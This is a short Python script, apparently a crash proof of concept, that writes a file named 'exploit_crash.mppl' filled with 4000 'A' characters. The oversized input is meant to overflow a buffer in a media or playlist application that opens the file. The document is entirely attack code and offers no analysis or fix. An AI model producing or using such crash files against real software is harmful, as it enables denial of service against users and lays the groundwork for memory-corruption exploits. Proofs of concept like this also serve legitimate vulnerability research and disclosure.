#!/usr/bin/python

file = open("exploit_crash.mppl", "wb")

buffer = "A"*4000

file.write(buffer)

file.close()
